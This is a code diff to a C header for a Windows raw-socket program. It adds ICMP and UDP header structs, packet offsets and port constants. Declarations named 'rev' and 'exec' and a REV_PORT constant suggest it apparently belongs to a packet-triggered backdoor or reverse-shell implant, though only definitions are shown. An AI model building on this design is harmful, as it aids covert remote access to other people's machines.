@@ -1,12 +1,12 @@
 #pragma once
 
+#ifdef DEBUG
 #include <errno.h>
-#include <stdint.h>
 #include <stdio.h>
-#include <string.h>
+#endif
+#include <stdint.h>
 #include <winsock2.h>
 #include <mstcpip.h>
-#include <iphlpapi.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -16,16 +16,31 @@ void rev(char*);
 void exec(char*);
 
 
+struct icmp_hdr_s {
+	uint8_t type;
+	uint8_t code;
+	uint16_t checksum;
+	uint16_t id;
+	uint16_t seq;
+};
+
+struct udp_hdr_s {
+	uint16_t	source;
+	uint16_t	dest;
+	uint16_t	len;
+	uint16_t	check;
+};
+
 struct tcp_hdr_s {
-	unsigned short int 	th_sport;
-	unsigned short int 	th_dport;
-	unsigned int 		th_seq;
-	unsigned int 		th_ack;
-	unsigned char 		th_x2 : 4, th_off : 4;
-	unsigned char 		th_flags;
-	unsigned short int 	th_win;
-	unsigned short int 	th_sum;
-	unsigned short int 	th_urp;
+	uint16_t 	th_sport;
+	uint16_t 	th_dport;
+	uint32_t 	th_seq;
+	uint32_t	th_ack;
+	uint8_t 	th_x2 : 4, th_off : 4;
+	uint8_t 	th_flags;
+	uint16_t 	th_win;
+	uint16_t 	th_sum;
+	uint16_t 	th_urp;
 };
 
 
@@ -47,12 +62,19 @@ struct ip_hdr_s {
 #define BUFFER_SIZE_ETH 14
 #define BUFFER_SIZE_IP (BUFFER_SIZE_PKT - BUFFER_SIZE_ETH)
 #define BUFFER_SIZE_TCP sizeof(struct tcp_hdr_s)
+#define BUFFER_SIZE_UDP sizeof(struct udp_hdr_s)
+#define BUFFER_SIZE_ICMP sizeof(struct icmp_hdr_s)
 
 #define BUFFER_OFFSET_ETH 16
 #define BUFFER_OFFSET_IP (BUFFER_OFFSET_ETH + BUFFER_SIZE_ETH)
 #define BUFFER_OFFSET_L4 ( BUFFER_OFFSET_IP + sizeof(struct ip_hdr_s) )
-#define BUFFER_OFFSET_DATA ( BUFFER_OFFSET_L4 + sizeof(struct tcp_hdr_s) )
+#define BUFFER_OFFSET_TCP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct tcp_hdr_s) )
+#define BUFFER_OFFSET_UDP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct udp_hdr_s) )
+#define BUFFER_OFFSET_ICMP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct icmp_hdr_s) )
 
 #define SRC_PORT 	6006
 #define SRC_PORT_2	8557 
 #define REV_PORT 	2628
+
+#define ICMP_REQ 	8
+#define ICMP_CODE	1
